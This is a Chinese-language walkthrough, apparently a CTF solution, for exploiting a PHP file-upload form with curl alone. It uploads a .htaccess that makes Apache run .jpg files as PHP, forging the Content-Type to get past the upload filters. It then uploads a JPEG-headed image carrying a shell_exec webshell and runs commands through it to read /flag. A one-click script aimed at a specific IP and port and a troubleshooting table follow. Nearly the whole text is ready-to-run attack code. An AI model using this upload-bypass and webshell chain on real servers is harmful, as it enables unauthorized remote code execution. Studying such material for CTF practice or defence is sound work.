# 40 · 纯 curl 手工三步（无需 Burp）

> 把 `$B` 换成你的目标地址。所有命令直接复制到终端跑。

```bash
B=http://目标地址:端口
```

## Step 1 · 上传 `.htaccess`

`curl -F` 用 `filename=...;type=...` 显式指定 multipart 字段的文件名和 Content-Type，绕过黑名单 + MIME 白名单：

```bash
echo 'AddType application/x-httpd-php .jpg' > ./ht
curl -s "$B/" -F "file=@./ht;filename=.htaccess;type=image/jpeg"
```

预期：返回页面里包含 `/uploads/.htaccess`。

## Step 2 · 上传图片马 `shell.jpg`

JFIF 头 + PHP 一句话，拼成"看起来是图片但里面有 PHP 代码"：

```bash
printf '\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00' > ./shell.jpg
printf '%s' '<?php echo "FLAG:".shell_exec($_GET["c"]); ?>' >> ./shell.jpg
curl -s "$B/" -F "file=@./shell.jpg;type=image/jpeg"
```

预期：返回页面里包含 `/uploads/shell.jpg`。

> ⚠ PHP 代码必须用 **单引号** `'...'` 包裹，否则 bash 会把 `$_GET` 当变量展开变成空。

## Step 3 · 触发 RCE 读 flag

Apache 因 `.htaccess` 把 `.jpg` 当 PHP 解析，`?c=` 传命令：

```bash
curl -s "$B/uploads/shell.jpg?c=cat+/flag" | strings | grep -i flag
```

预期输出：

```
FLAG:TOGOGO-flag{xxxxxxxx}
```

## 一键全自动版（懒人）

```bash
B=http://47.120.76.57:35467/

# 1. .htaccess
echo 'AddType application/x-httpd-php .jpg' > ./ht
curl -s "$B/" -F "file=@./ht;filename=.htaccess;type=image/jpeg" >/dev/null

# 2. shell.jpg
printf '\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00' > ./shell.jpg
printf '%s' '<?php echo "FLAG:".shell_exec($_GET["c"]); ?>' >> ./shell.jpg
curl -s "$B/" -F "file=@./shell.jpg;type=image/jpeg" >/dev/null

# 3. 触发
curl -s "$B/uploads/shell.jpg?c=cat+/flag" | strings | grep -i flag
```

## 常见踩坑

| 现象                                  | 原因                                                                     | 解决                      |
| ------------------------------------- | ------------------------------------------------------------------------ | ------------------------- |
| Step 1 返回"文件类型不允许"           | 没加 `;type=image/jpeg`                                                  | 补上 type                 |
| `/uploads/.htaccess` 访问 403         | 正常，Apache 默认禁访问 `.ht*`，不影响生效                               | 直接走 Step 2/3           |
| Step 3 返回 PHP 源码而非执行结果      | `.htaccess` 没生效（可能 Apache 没开 AllowOverride，或上传到的目录不对） | 重抓 Step 1 看响应路径    |
| `$_GET` 被 bash 展开成空              | PHP 代码用了双引号                                                       | 改成单引号 `'...'`        |
| `printf` 写入的二进制头变成字面字符串 | 用了 `echo` 或双引号转义错                                               | 严格按 `printf '\xff...'` |
